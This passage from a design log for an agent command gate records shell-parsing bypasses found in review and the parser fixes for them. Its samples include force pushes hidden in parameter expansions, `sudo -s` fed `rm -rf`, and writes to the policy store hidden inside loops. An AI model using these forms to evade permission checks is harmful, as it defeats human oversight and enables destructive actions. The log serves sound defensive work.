  (b) sudo and the privileged wrappers make `costly` only the deciding part of a nested line they run (a remote
  command, a `bash -c` line). Where a `>( )` or a `$( )` in that line now reads an ssh as fed, the new part decides
  that line, so a rule that denies `costly` `shell` or `read` parts asks instead: `sudo ssh jump 'tee >(ssh host)'`,
  as main decides `sudo ssh jump 'ssh host < f'`. With #320 (2026-10-22 amendment above) a costly copy of each part
  the wrapper runs sits beside it, so that rule denies both lines. (c) The flag before a word that may expand: `ssh -n
  "$h" uptime < hosts.txt` took the #240 reading (`opaque_exec`, ask) and now takes its own (`read`, allow), since ssh
  never reads its stdin then. That `opaque_exec` part is gone, so `deny: [opaque_exec]` no longer denies such a line,
  a reserved entry loses its hit on that part, and after a `cd` into the store the line is no longer a store write
  (`cd ~/.exo/state && ssh -n "$h" uptime < hosts.txt`). Each such line decides as main decides it with a plain host
  in place of the word (`ssh -n host uptime < hosts.txt`). In (a) and (b), `deny` entries, `reserved` entries and
  category lines that deny a category still see every part. The #423 differential against main 5a9dc394, each tree
  in its own process, finds only these kinds, and a script sorted every lowered pair into one. (c) is each pair that
  is not lower once the sure-flag change is undone, and each of those has the outcome and the reserved categories
  main gives the line with a plain host in place of the word. The built-in corpus, 55,970 actions under the
  87 policies built into the script, lowers 4,721 pairs on 133 actions: 145 of kind (a), 6 of kind (b) and 4,570 of
  kind (c), most of them the test lines for (c) in the compound forms the script makes of each line. 72 of the (c)
  pairs lose the reserved hit on the `opaque_exec` part that is gone, and still ask. A focused corpus of 33,828
  actions (5,740 lines and the forms the script makes of them: twenty-six fed forms behind nineteen wrappers,
  twenty-four host spellings with flags, option values and `--` in six fed forms, hops with thirty-four remote
  commands behind twelve outer spellings and nine stdins, the store and secret folders around fed lines, posts beside
  hops, privileged wrappers around nested fed lines, and everyday ssh, logging and declare lines) under 114 policies
  (the 87 and 27 more: host targets and scopes, deny and reserved entries, `shell` and `opaque_exec` category lines,
  and rules on `ssh`, `tee`, `uv run`, `sudo`, `cat`, `while`, costly parts and exposure) lowers 110,914 pairs on
  6,858 actions: 9,354 of kind (a), 176 of kind (b) and 101,384 of kind (c), 3,017 of them a lost reserved hit.
  Kind (a) also takes in a known text a hop reads under a policy that allows or logs its category (32 of the focused
  pairs): `gh pr comment 7 --body done && echo 'rm -rf /srv/app' | sudo ssh bastion 'timeout 5 ssh db1'` under a
  policy that allows every category goes from the post's third-party ask to `allow`, as the line with `sudo ssh db1`
  in place of the hop does. A known text that reaches an ssh only through a `>( )` is read as a stdin the gate
  cannot read, as for `tee >(bash)`, so `echo 'rm -rf /srv' | ssh jump 'tee >(ssh host)'` is `opaque_exec`, not
  `delete`. Known limits: a nested shell in a fed line reads its own line unmarked (`>(bash -c 'ssh
  host')`, `flock -c`, `env -S` ask anyway). On a fed line a `$( )` is read as fed even where the command it sits in
  reads a pipe, which fails closed. A stdin set earlier by `exec < file` is still not seen. Rejected: parsing the
  remote command for one ssh as its first command, the first draft, which missed `ssh a 'cd /; ssh b'` and a second
  hop. Rejected too: building the new part into ssh's own part and reading a hop's remote command only as fed, an
  earlier draft of this change, which lost sudo's `costly` mark and the reserved hits of the part it displaced. And
  keeping the displaced part as the deciding part, which would make these lines decide unlike their direct form.
  *2026-10-24, merged with main d79639f1 (#399, #435), and exo-36's review of #520:* #399 decides a gh post on each
  target the gate cannot rule out, and an ssh gives an empty one its host. The part that runs ssh's stdin takes that
  fill too where it names the host for an empty target: where it leads (the direct form) and where the stdin is not
  direct (a hop, a compound's feed). Without it, `echo 'gh pr comment -wR myorg/app -b hi' | ssh buildhost` lost
  main's deny under a `github_post` deny on `buildhost`, its other target and its reserved hit. After a hop the host
  is the first one, where the line hands the stdin over, as for the part's own empty target before the merge, so a
  deny on the first host still denies the post; ssh's own part names the inner host. A `$( )` in a value declare
  reads again (#188) runs while declare runs, so it is read as fed where a `$( )` of the line is, and also where
  declare has a stdin of its own (`cat f | declare -a 'a=($(ssh h))'`, `declare -a 'a=($(ssh h))' < f`): it asked
  as `shell`, and asks as `opaque_exec` now. Cost: a hop's remote command is read a second time, as a fed line, so
  a crafted line of quoted hops reads in up to about 1.5 to 1.8 times main's time: exo-36 measured 10 nested quoted
  hops (88,646 characters) at 2.9 to 3.3 s on main 5a9dc394 and 4.0 to 5.5 s on this branch, and a line of quoted
  hops that fan out (15,657 characters) reads in 0.12 to 0.14 s on main d79639f1 and 0.21 to 0.23 s on the merge.
  Each line is still read once per depth and per mark. The #423 differential against main d79639f1, each tree in its
  own process: the built-in corpus, 65,231 actions under the 87 policies, lowers the same 4,721 pairs on 133
  actions, 145 of kind (a), 6 of kind (b) and 4,570 of kind (c), 72 of them a lost reserved hit. A focused corpus of
  10,368 actions (#399's gh lines with `-R`, URL operands, other readings, a subcommand past an option and gh api,
  fed to ssh through each source above and run as ssh's remote command) under 109 policies (the 87 and 22 more:
  deny and reserved entries on the hosts and on `github_post` with a host as target, scopes, and rules on gh and
  ssh) lowers 16 pairs on 8 actions, all of kind (a): `{ ssh buildhost; } < cmds.sh; gh pr merge ...` under a
  policy that allows `opaque_exec`, as `ssh buildhost < cmds.sh; gh pr merge ...` is on main. Against this branch
  before the merge the focused corpus lowers nothing. A second check of the merge ran a focused corpus of its own:
  5,810 actions (the gh lines above beside a local post, posts read in a hop, and many posts on one line) under 140
  policies (the 87 and 53 more, among them scopes that make `myorg/*` and the hosts private, with a footer or a
  scrub). It lowers 278 pairs on 54 actions: 222 of kind (a), 40 of kind (b), and 16 that kind (a) also takes in
  now. A post a hop reads can displace a later post of equal weight as the deciding part, and #399 decides only the
  deciding part on its other targets. So `echo 'gh pr comment -wR myorg/app -b hi' | ssh jump ssh buildhost && gh
  pr comment -wR myorg/app -b hi` is decided on the hop's post, on `myorg/app` and `jump`, both private there, not
  on the later post's current repo. Main lists the later post's missing footer or scrub hit twice, for that reading
  and for the post's copy on the current repo. The merge lists it once, for the copy, and the line still asks. Under
  a policy that allows `opaque_exec` too, such a line goes from the later post's third-party ask to `allow`. Each
  such line decides as main decides it with `ssh buildhost` in place of the hop, on the outcome, the exposure, the
  third party and the violations: 250 of 250 lowered pairs of 80 such lines under those 53 policies. Against this
  branch before the merge that corpus lowers nothing.
  *Revisit if:* sudo and the privileged wrappers mark every part they run `costly` ((b) then goes).

  *Amendment 2026-10-24 (issue #528):* the shared patch-path reader also reads Codex's `*** Move to:`
  destination, alongside its `*** Update File:` source. Before this, a move from an ordinary file into a
  protected store was an allowed local write. Both paths now use the same secret and store checks as the other
  patch headers, including braces and absolute links.

  A secret destination is `credentials`. A store destination
  is `store_write`. The file's own local-write parts keep policy entries on both source and destination. A
  `+*** Move to:` line is hunk content, not a header. Chosen over a separate move-path checker so the two formats
  share protection and limits.

  *Amendment 2026-10-25 (#548 follow-up):* the reader's `\s` let a header's path run onto the next line. A header
  with no path (`*** Move to:`, `*** Add File:`, `*** Delete File:`, `*** Move File: a ->`) took the next header
  line as its path, and that header's write was never read. A patch tool skips the bare line and applies the next
  header. With #548's `Move to:` alternative, a bare `*** Move to:` let a secret or store write through. The
  post-merge review's aimed run counted 11,340 lowered pairs against the main before #548, among them
  `credentials` deny -> allow. The paths are now also read
  one line at a time (space other than a newline, so a `\r` before it is trimmed), and the reading as before is
  kept beside it. So every path main found still counts. A local write of more than one file keeps each file as a
  `local_write` part, as #448 does for a secret or store write, so an exact `target:` deny or reserved entry reaches
  a path only the reading on one line found (`deny: [target:notes.txt]` after a bare `*** Move to:`), and any later
  file of a well-formed patch. The call keeps main's target, the first path read as before, so an entry that matched
  it still does; after a bare header that target is the swallowed header text, and the card shows it. The reading
  across a line stays because dropping it would lower a line under an entry that matches what it reads. Against
  main 2923f8b9, `scripts/gate_diff.py` reports nothing lowered (counts in the PR). Against edeb4f89, 2cc0c32f
  and f10a7489 it counts 58 lowered pairs on 55 actions, and main 2923f8b9 counts the same 58 pairs, with the
  same split, against each of those bases. Every lowered example in those runs is a `hash -p` line, from the
  reading #409 added after those bases. No patch action is lowered in any of them.
  *Revisit if:* the gate parses patches with the patch tool's own header grammar.

  Relative aliases into non-secret stores still need #340's resolution. Relative
  secret links use the existing secret-path check. No patch is applied while classifying, and no tool schema or
  executor behavior changes.

  *Amendment 2026-10-25 (issues #143, #553, #554, PR #158):* the lexer ended a `${...}` word at its first `}` and
  read nothing in it, and counted every parenthesis of a `$((`. So `echo ${X:-$(git push --force origin main)}` was
  an allowed `read` under every policy, a `'}'` in a word hid the command after it, `echo $((echo '((' ; git push
  --force origin main) )` was arithmetic (#553), and `${@@P}`, `${*@P}`, `${!@}` and `${!*}` were reads while
  `${name@P}` already asked when its value was set on the line (#554). `_Lexer` now reads these as bash's parser
  does in its default mode, on main's lexer: the same `run`, `_NEST` cap, `_nest_end`, token marks, `_own_text`,
  `_given_stdin`, parse memo and three-value `_parse`. *Words* (`_Lexer._param`): a `}` closes only outside quotes
  and escapes; a `'` pairs with the next one, in double quotes too; `$'..'` keeps `\'` escaped; a nested `${` is a
  level on a stack. Each `$( )`, `$((` and backquote in a word, and each `<( )` and `>( )` outside double quotes, is
  read by a lexer of its own and listed as a source, so a here-document opened in it stays in it (fdn-0's second
  blocking row, review 5641579458). Single-quoted text bash expands is read within that text alone, so a part opened
  in it ends at its quote (the first blocking row). `${!name}` and the other indirect forms of a name, a digit, `@`
  or `*`, and `${name@P}`, `${@@P}`, `${*@P}` and `${@:n@P}`, run a value and ask; the listing forms do not. bash
  5.3's `${ cmd; }` is read and asks. *`$((`* (`_Lexer._arith`): arithmetic only when bash's parser match
  (`_group_end`, `_arith_end`) and its second reading at expansion (`_expand_end`) end at the same `)` and the text
  balances as `chk_arithsub` counts it (it counts the parentheses of a `${...}` in a nested `$( )`, which the parser
  steps over); a group whose nested `$( )` holds a comment or a here-document is read as a `$( )` (stricter than
  bash). Else it is a `$( )` holding a subshell, read up to the parser's end (`_group_sub`); one that never closes
  takes the rest of the text and asks (bash rejects the line). Each group's end is kept for a chain of them.
  *Depth and budget:* a part only the new reading opens (a `$( )`, `<( )`, `>( )`, backquote or arithmetic `$((`
  in a word, a `$((` read as a subshell, quoted text bash expands, the text of `${ cmd; }`) is read three levels
  deep, counted alike for each kind: its own `$(`, `<(`, `>(` or backquote is level 1 (in arithmetic, quoted text
  and `${ cmd; }`, the first `$(` or backquote in it), and each one inside is a level more (`_WORD_NEST`,
  `_Lexer._part`, `_Lexer._deeper`; a backquote in such a part is a level too). A deeper level is an unread part
  that asks, as one past `_NEST` does: the reading before costs next to nothing on such a nest, and reading it to
  `_NEST` cost 10 to 40 times as much as that reading. One classify call opens `_WORD_PARTS` (24) such parts, in
  classify order, each counted once for each lexer pass that opens it: the line's, each `$( )` level around it, and
  the passes of `_dollar_brace` and `_unknown_forms` over a `$( )` in a `${..}` word (the lexer of a line's
  literal-word view, `_policy_command_view`, opens none: a word holding a part is dynamic there either way). Inner
  levels are opened when their source is classified, after the rest of the line, so later parts can spend the budget
  first; a part past them is cut the same way. A part's
  source no longer lists the parts inside it a second time: they are listed when that source is read, a level
  deeper. So each line costs at most 3 times the reading before, or 15 ms more, on the review's families (CPU, best
  of 9).
  *Also:* a `$( )` or `<( )` reads its own here-documents (`_Lexer._nested`), a backslash-newline after `$` is
  joined by #584's joined reading (this PR's own join in `_parse_line` gave way to it on the merge of main
  dcab371a), `$'` in double quotes is a `$` and a quote, and `_nest_end` ends a part past the cap where the lexer
  would, both readings (#334's equality test holds for each). *Two readings.* Where the new reading may differ
  anywhere in a call (`_Lexer._differ`: a word closed past its first `}`, a source read in a word, a `$((` matched
  otherwise, an over-deep part the reading before ends elsewhere or one holding a here-document), `classify` reads
  the call again with the lexer as before (`_flat_words`), with budgets of its own, and puts that reading at the end
  of the call's `also` chain; `readings` walks the chain, so `decide`, `no_grant`, `call_approvers`, `body_unseen`
  and the hook read both and the stricter holds. `binds_exact` and `is_outward` read each reading too, and a line
  whose readings are different acts binds its approval to the exact text, so an "always" on its first reading's
  category and target covers no line main bound to its text. A part the new reading adds can lead a line and turn
  a category line or the opaque floor (a push a word hid outranks a visible delete), and dash, the `/bin/sh`
  fallback, ends a word at its first `}` where it has no `<( )` or pairs no `'` in `"${x:-..}"`: the reading before
  keeps both at their decision on main. A line that ends inside a quote (`'`, `"` or `$'`), which bash and dash
  reject, asks (a shell
  closing the quote elsewhere runs the rest), also under #394's catch-all `log` rule, with the reading before kept;
  one left inside a `$( )` or a backquote is read as before, so that rule still logs `echo $(`. *Checked:*
  `scripts/gate_diff.py` of main against this tree lowers nothing: the built-in corpus (9,676 actions x 87
  policies, no variants, 16,240 pairs tightened on 264 actions), an aimed corpus (27,251 actions: every line of the
  parameter-expansion, ANSI-C and command-quote tests and of the earlier port's tests, every heredoc, `$((` or `${`
  literal of `tests/security`, generated words for each operator, nested source and quoting with a push or a delete
  after, the review's repro lines, over-deep nests, nests in words and in `$((` at each depth up to 20, each kind of
  part at each level from 1 to 7, lines past the 24-part budget, 1,200 fuzzed lines and the review rounds' corpora,
  under the 87 policies and 19 deny, category and reserved policies on force_push, vcs_push, delete, web_post and
  opaque_exec; 660,606 pairs tightened on 15,595 actions), and the built-in corpus with variants (72,373 actions x
  87 policies, 26,409 pairs tightened on 422 actions). Rejected: keeping main's reading alone and adding
  bash's sources as parts (a word closed past its first `}` hides the command after it, which no part reaches);
  re-applying #158's earlier lexer (main's `_nest_end`, marks and memo would be lost). Limits, in `docs/GATE.md`
  "Shell parameter expansion (D-038)": arithmetic on a bare name (`$((x))`, `${s:x}`) evaluates a value the gate
  does not see; a command more than three levels deep in a part only the new reading opens, or in a part past a
  call's 24, is not read: it asks, also under a deny on it, and a rule allowing `opaque_exec` allows it, as main
  does; dash's other differences and bash 3.2's pairing are not modelled; a word bash never closes asks, and what
  follows it is read only the way before.
  *Re-checked 2026-10-26 (review 5652171811, on the merge of main dcab371a):* each mark in this lexer code that makes
  a line or part fail closed (an odd part: a value that runs, `${ cmd; }`, a word, `$((` or quote left open; an unread
  part: past `_WORD_NEST`, the `_NEST` cap or `_WORD_PARTS`; a part that takes the rest of the text, in `_Lexer` and
  in `_nest_end`) was neutralized alone in a copy of the tree, 28 marks, and each copy fails a row of
  `tests/security/test_gate_parameter_expansion.py` whose line asks for that mark alone or pins where it ends (a plain
  `echo`; the table is in the PR). With main's #584 and D-074, each of classify's two readings keeps its joined
  reading and its `ordinary` reading, with budgets of their own (`_classify_read`); `readings` lists the `ordinary`
  reading of each reading, not only the call's, and `binds_exact` keeps main's rule that a line with an `also` or
  `ordinary` reading binds. Since the reading before #143 ends the `also` chain, every line read both ways now
  binds its approval to the exact text, also where both readings are one act (`echo hi > /tmp/f ${x:-$(echo hi)}`):
  a standing grant on that category and target no longer covers it (main reads such a line one way and does not
  bind it). This tightens and lowers nothing; a line read one way keeps its grants
  (`test_a_line_read_two_ways_binds_to_its_text_even_as_one_act`). This PR's own join of a backslash-newline after
  `$` in `_parse_line` gave way to #584's joined reading, which keeps the line as written beside it and leads with
  the more severe, so `: # $\<newline>(git push ...)` (bash runs the next line) leads its card with the push, as on
  main. A command past the depth or the budget still asks under a deny on it, and a rule allowing `opaque_exec`
  allows it, as main allows the line (main reads none of the word); a deny there is follow-up work.
  *Re-checked 2026-10-27 (review 5659098661, on the merge of main 15e60ddb):* `classify` reads the call each way
  in `_classify_read`, which keeps main's #584 joined reading and D-074 `ordinary` reading for each, with budgets
  of their own; `readings` is main's walk plus the `ordinary` reading of every reading; `binds_exact` keeps each of
  main's conditions and adds them for every reading; `as_dict` pops what main pops (this PR adds no field). A
  command in a word keeps the readings it has alone, main's newer ones too: an ssh host target (#493), each store
  path a write names (#514), a code-load folder (#459), a gh download into the store (#461), a glob in a secret
  store's folder (#594) and a here-document's exact delimiter line (#328)
  (`test_a_command_in_a_word_keeps_mains_newer_readings`). `scripts/gate_diff.py` of main 15e60ddb against this
  tree lowered nothing on the built-in corpus and on an aimed corpus (the counts measured then came from a corpus
  harvested before the last test edit; the re-check below gives counts measured on its final tree).
  *Re-checked 2026-10-27 (reviews 5661670054 and 5652171811, on the merge of main 58503282):* the reading before
  #143 (`_flat_words`) is main's own lexer, whose newer readings it takes whole: #553's `$((` (`_dollar_paren`: a
  `$((` bash runs as a `$( ( )` is read as one; one never closed stays arithmetic text), #585's backslash-newline
  after `$`, #588's `$[ ]` and #579's `${..@P}`. bash's reading keeps #588 and #579 as main reads them, and is
  read beside main's wherever they may differ: a `$((` main's `_dollar_paren` ends elsewhere or reads as the other
  form, and a `${` a backslash-newline splits, which main reads to its first `}` as text bash runs. A `${..@P}`
  the word lists is weighed as #579 weighs it (a parameter the line assigns a literal keeps the read); one only
  bash's reading opens asks. Two rows of this PR change with main: a `$((` main reads as a subshell is read by
  main every level to the `_NEST` cap, so a push four levels deep there denies, and `echo $(( ${x:-'))`, a push
  line, `'} ))` reads as main reads it, a read (bash and dash run nothing there, checked with a printf probe);
  main's own `echo $((echo hi; echo HIDDEN` row asks here, as a `$((` bash never closes does. A command in a word
  keeps main's newer readings, each pinned by the outcome the main PR added (the PR's first parent decides the
  command alone lower: #611 under `deny: [target:*/gates.yaml]`, #604 and #609 under a store deny, #328's `EOF `
  delimiter under a push deny), and by its part targets: also #634, #643, #652, #635, #641 and #633. Rows pin a
  word with each of the joined reading (#584), the config-store `ordinary` reading (D-074) and the camelCase floor
  (#515, #602: set only for a generic tool, whose arguments are never read as a shell line, so no call holds both
  it and the reading before #143), each with its outcome and exact binding. The 28 fail-closed marks were each
  neutralized alone in a copy of the merged tree, and each copy fails a row whose line is a benign `echo` (the
  reading before, mark m27, through `test_a_benign_line_only_the_reading_before_asks_about`). `scripts/gate_diff.py`
  of main 58503282 against this tree lowers nothing: the built-in corpus (12,515 actions x 88 policies, no
  variants, 17,602 pairs tightened on 296 actions) and an aimed corpus regenerated from this tree's tests and
  main's new lexer tests, with 239 calls that put each of main's newer readings in, beside and past a word and
  the composition calls (15,117 actions x 116 policies: the 88 built in, the 19 aimed ones, 5 on `store_write`
  and `credentials` and 4 on targets and allow rules; 257,162 pairs tightened on 4,766 actions). Its first run
  found 4 pairs on 2 lines lowered by the merge itself (`echo $[$(`: a `$[` no `]` closes lost its last
  character, so the `shell` part main reads was gone under a category deny); the port now reads that span to its
  end as main does (`test_a_legacy_arithmetic_span_left_open_keeps_mains_reading`). The level-4 and budget limit
  under a rule allowing `opaque_exec` stays a documented limit (`docs/GATE.md` "Known limits"), no lower than main.
  *Re-checked 2026-10-28 (review 5678114763, on the merges of main 347746ad and f28934a3):* main f28934a3 reads
  each `env -S` text again as a call of its own (`split_readings`, #591 and #707) and the stdin of a `sudo -s` or
  `sudo -i` shell, with the line as read before #491 at the end of its floors (#491, #718). `classify` keeps main's
  loop over the `env -S` readings, and each of them is read both ways (`_classify_reading`: as the lexer reads now
  and, where the two may differ, as before #143 at the end of that reading's `also` chain), each with its own
  joined (#584), `ordinary` (D-074) and sudo floor readings, so a word bash reads in an `env -S` text or a sudo
  shell's stdin is read in every one of main's readings. `readings` lists the `ordinary` and `split_readings` of
  every reading, not only the call's, and `binds_exact` binds a line with either in any reading; the hook's bypass
  floor reads main's first split reading as main does, and `no_grant` every reading. Rows in
  `tests/security/test_gate_parameter_expansion.py` (24 that fail on main f28934a3 and 8 guards) and
  `plugins/exo-gate/tests/test_approvals.py` (4 rows: principal-only approvers, no standing grant) pin the
  composition; four `test_unseen_body.py` rows keep both unseen notes there. `scripts/gate_diff.py` of main
  f28934a3 against this tree lowers nothing: the built-in corpus (13,205 actions x 88 policies, no variants,
  17,950 pairs tightened on 353 actions) and an aimed corpus that adds a combination corpus harvested from main's
  #591, #491 and hook tests, with this PR's word forms around them and inside `env -S` texts and sudo stdin
  (31,670 actions x 151 policies, 4,782,170 pairs, 993,319 tightened on 13,337 actions).
  *Re-checked 2026-10-28 (on the merge of main 34b5b495, #546 for #471):* main reads a call with a quoted prefix
  assignment both ways: after the prefix, and as before #471 with the quoted word the program
  (`Classification.before`, made by `classify` around main's `env -S` loop `_split_reading`), and decide,
  `readings`, `binds_exact`, `no_grant`, `call_approvers`, the store scan and the hook's bypass floor read both.
  The layers nest: `classify` (#471) -> `_split_reading` (#591, #707) -> `_classify_reading` (this PR's two ways)
  -> `_classify_read` (budgets, the #584 joined reading, the gh and #491 sudo floors, D-074's `ordinary`, #515's
  camelCase floor). So `before` is main's own reading of the call, `env -S` readings and all, and every reading
  either side makes, the reading as before #143 of each `env -S` reading of `before` included, is listed by
  `readings`. `readings` walks the `ordinary`, `before` and `split_readings` of every reading (main walked the
  call's); `binds_exact` keeps this PR's per-reading test and adds main's `unknown program` signal to it, and since
  `before`'s readings are listed, a line binds wherever main's recursion into `before` bound it. The reading as
  before #143 is now named on the reading it ends (`Classification.flat`, popped from `as_dict`), and the exo-gate
  hook's bypass floor takes main's own reading first: behind a quoted prefix `before`, its first split reading,
  and that reading's `flat` where its words were read both ways. Taking bash's reading there instead, as the
  isolated head did, asked at the floor for 60 of 908 hook probe lines main held (a post that breaks the posting
  rules beside a secret or store write only bash's reading of a word finds); they are held again, and the
  secret still asks at the floor through `no_grant` once the post is fixed. Rows in
  `tests/security/test_gate_parameter_expansion_quoted_prefix.py` pin the composition (a word behind, inside and
  around a quoted prefix, in an `env -S` text and in a sudo shell's stdin; each line at least as with a plain
  prefix and with the word quoted whole; a word in an arithmetic `$((` too), and
  `plugins/exo-gate/tests/test_bypass.py` its bypass floor and hold. `scripts/gate_diff.py` of main 34b5b495
  against this tree lowers nothing: the built-in corpus (1,210,616 pairs, no variants, 20,428 tightened on 433
  actions) and an aimed corpus of the 4,190 composition lines and 1,200 arithmetic-word lines under 112 policies
  (603,680 pairs, 29,281 tightened on 3,018 actions); the hook in bypass decides none of the 908 hook probe lines
  lower than main 34b5b495 (158 stricter).
  *Re-checked 2026-10-29 (on the merge of main a1dd4fec, #838 for #479):* main reads a call that holds a loop
  whose body `cd`s into the store a second time, with the loop's commands read in the store (`_loop_reading`,
  `_loop_again`, `_LOOP_BUDGET`), and keeps that reading beside its own (`_beside`). #838 put that reading in
  main's per-reading function, which this PR calls `_classify_read`; the merge keeps it there, so the layers are
  `classify` (#471) -> `_split_reading` (#591, #707) -> `_classify_reading` (this PR's two ways) ->
  `_classify_read` (budgets, #584's joined reading, #838's loop reading, the floors). Each of the two ways of
  reading the words then has its own loop reading and its own budget: bash's reading reads the command in a word
  of such a loop in the store on the next pass, and the reading as before #143 (`flat`) is main a1dd4fec's own
  reading, second pass and all, which the hook's bypass floor takes first as before. No code beyond the textual
  merge was needed (only `CHANGELOG.md` conflicted; `src/exo/gate.py` merged clean, #771's renames and #775's
  `gc.recentobjectshook` key kept). So `for i in 1 2; do echo ${v:-$(cp /tmp/evil gates.yaml)}; cd
  ~/.exo/policies; done`, an allowed read on main a1dd4fec and on this PR before the merge, is a `store_write`,
  the principal's alone and denied under `deny: [store_write]`, also in an `env -S` text, a sudo shell's stdin, a
  `$((`, a `{ ..; }` body or a loop inside a word; a `cd` in a word's `$( )` runs in a subshell and leaves the
  loop where it was. Rows in `tests/security/test_gate_parameter_expansion_loop_cd_store.py` (14 that fail on
  main a1dd4fec and on this PR before the merge, guards, and each loop line at least as with the word's plain
  substitution) and `plugins/exo-gate/tests/test_bypass.py` pin it. `scripts/gate_diff.py` of main a1dd4fec
  against the merge lowers nothing: the built-in corpus (1,227,248 pairs, no variants, 21,852 tightened on 441
  actions) and an aimed corpus of 4,315 loop lines under 112 policies (483,280 pairs, 38,849 tightened on 1,044
  actions); a probe of those lines under 24 policies decides 0 pairs lower than main a1dd4fec or this PR before the
  merge, and the hook in bypass none of 1,440 of them.
  *Re-checked 2026-10-29 (on the merge of main 69e33d50, #839 for #547, #862 for #853):* main reads a compound
  behind `time`, `time -p`, `time --`, `!` and their combinations opened as well (#853, `_opened_reading`), reads a
  while/until condition's `cd` into the store a second time (#857), and on a store line asks a rule that would lift
  a part's deny in the #191 pass to pass the whole line's own text test as well (#547, `_whole_line_test`). #862
  gave main's per-reading function, which this PR calls `_classify_read`, a new body; the merge takes that body,
  `_opened_reading` and `_one_reading` as main has them, under this PR's name (the one conflict, in
  `src/exo/gate.py`). The layers are `classify` (#471) -> `_split_reading` (#591, #707) -> `_classify_reading`
  (this PR's two ways) -> `_classify_read` (budgets, #853's opened reading) -> `_one_reading` (#584's joined
  reading, #838's loop reading) -> `_read_core` (the gh and sudo floors, D-074's `ordinary`). Each of the two ways
  of reading the words has its own opened reading with its own budgets, and `flat` is main 69e33d50's own reading,
  opened reading and all. #547's
  test reads the line as classified, so a store send in a word makes the line a store line there too:
  `git push --force origin main && echo ${v:-$(gh gist create ~/.exo/plugins/foo/__init__.py)}`, which main
  69e33d50 allows under the irreversible deny matrix with a `^git push` allow rule (log or ask under a log or ask
  rule), is denied, and asks without the whole-line test. Rows in
  `tests/security/test_gate_parameter_expansion.py` pin the composition: 41 rows that each fail on main 69e33d50;
  29 of them fail on this PR before the merge too (a prefixed compound inside a word, 7 store-entering prefixed or
  condition-cd loops with a word, and 21 store sends in a word beside a push that fail without the whole-line test
  as well), and 12 are guards this PR held before the merge. `scripts/gate_diff.py` of main 69e33d50 against this
  tree lowers nothing: the built-in corpus (1,245,728 pairs, no variants, 23,389 tightened on 487 actions) and an
  aimed corpus of 12,544 lines (this PR's earlier aimed lines and 3,719 composition lines) under 121 policies
  (1,517,824 pairs, 251,042 tightened on 5,120 actions).

  *Amendment 2026-10-26 (issue #491):* `sudo -s`, `sudo -i`, `sudo --shell`, `sudo --login` and `doas -s` with no
  command start the target user's shell, and that shell runs its stdin. The prefix reader left no program, so the
  line was a bare assignment, `read`, and `echo 'rm -rf /srv/data' | sudo -s` or
  `sudo -s <<< 'cp /tmp/x ~/.exo/policies/x'` ran with no ask, under `deny: [delete]` too, while `sudo bash` with the
  same stdin was read. The gate now reads such a shell as `bash` with no operand (as #240 reads `ssh host`): an
  `opaque_exec` part that runs its stdin (`_runs_stdin`), and the parts of each text the line feeds it, read once per
  line under the same key as a fed `bash`. A stdin it cannot read asks, and so does a bare `sudo -s`, since a command
  around the line may feed it. sudo's and doas's options are read as getopt reads them (`_sudo_shells`): clusters,
  values attached or not, unique prefixes of sudo's long options, `--`, then sudo's `NAME=VALUE` words, for each
  sudo or doas the prefix reader passes (`env`, `nice`, `timeout`, `command`, another sudo). A word the gate cannot
  read that may come to `-s` counts as a shell option (`_sudo_unread`): an option word with an expansion or an
  unquoted glob (`sudo -"$X"`, `sudo -?`; review of #491: `sudo -$(printf s) <<< 'rm -rf x'` was allowed under
  `deny: [delete]`), unless it cannot split and the expansion comes after a letter or `=` that takes a value
  (`sudo -u"$U" -l` stays a read; an empty `$U` there makes `-u` take the next word, which starts no shell); an
  option's value that may split into several words (`sudo -u $U`, `sudo -u $(id -un)`; round 2 of the review:
  `sudo -u {root,-s} <<< 'rm -rf x'` was allowed under `deny: [delete]`), whose brace set is expanded with
  `_brace_words` and read as option words, keeping a word the set makes twice as bash does (round 3:
  `sudo -p {-s,-s}` is `sudo -p -s -s`, and the deduplicated expansion hid the second `-s`), and a bracket glob at
  the start of a value (`sudo -u [!a]s`), which the lexer does not mark as a glob; and an operand that may expand to
  an option (`sudo "$X"`, `sudo ?s`, `sudo {-s,}`, `sudo ~-`, which is `$OLDPWD`), which main read as an unknown
  program that asks, so a deny on the fed text only asked. Such a word may take the next word as its value
  (`sudo -$X root` may be `sudo -iu root`), so when the line feeds the command a stdin, the shell is also read with
  no command, and the options are also read again from the word after the next one (`_sudo_read`). A brace value
  whose words end the options elsewhere has its command read as sudo runs it, with no shell (round 3, on main too:
  `sudo -u {root,-p} echo rm -rf x` is `sudo -u root -p echo rm -rf x`, whose prompt is `echo`, and was allowed
  under `deny: [delete]`; so were `sudo -"$X" echo rm -rf x` and `sudo -u $U echo -s rm -rf x`). A may reading
  reads its command both as the shell would and as sudo runs the words bash expanded (round 4: read only as escaped
  shell text, a sudo there with a brace value was lost, so `sudo -E{,p} echo sudo -E{,p} echo rm -rf x` was allowed
  under `deny: [delete]`). Those readings may not be bash's, so they add only the parts their command is known to
  do, not `read` or `opaque_exec`: `sudo -u $U cat /etc/hosts`, `sudo -"$X" echo hi` and `sudo -u {alice,bob} ls`
  stay reads. A part that stands for a cap stays, though (`_a_cap`: a nest past the depth cap, the budget below):
  round 4 found five chained `sudo -u {root,-p} echo` read and allowed, the cap's ask dropped as a command the
  reading could not read; such a nest now asks. A call reads at most 16 of them, a moved reading with a shell
  option counted too (shared through the call memo); past that, it asks. This tightens a few lines that start no
  shell when the words expand otherwise (`sudo -u $U` alone asks as `bash` alone does, `echo hi | sudo -u $U tee
  /tmp/x` asks, and so do `sudo -u $U -l`, `sudo -l -U $U` and `sudo -u $U -v`, since the gate does not read sudo's
  list and validate modes, in which no shell starts), and never lowers one: each such reading only adds parts. With
  a command, sudo runs `$SHELL -c` on its words joined with spaces, each character but a letter, a digit, `_`, `-`
  and `$` escaped with a backslash. Where that text may not be the words the line's own reading took (a `$`, a
  newline the shell drops as a line continuation, an empty word, or `-iu root` and `--user root`, which the prefix
  reader takes for a program), the gate also reads it, beside an `opaque_exec` part, so the line asks as it did
  when it read an unknown program there and its approval binds to the exact command. Only the first such text is
  read at each level: it holds the sudos after it, which its own reading reads in turn as written (reading each of
  them again at each level made a 40-deep `sudo -s ... echo '$x'` take minutes). Their moved and may readings are
  still read: that text holds a brace value as a literal (round 4: `sudo -s sudo -u "$U" -u {root,-p} echo rm -rf
  x` only asked under `deny: [delete]` and was allowed under `{opaque_exec: allow}`). A text a parse read back as
  its words is not parsed again for a later sudo as written, whose command is a part of it, and the prefix reader
  walks the words by index (round 3: parsing the rest once per sudo made a 28 KB chain of `sudo -u {root,-s}` take
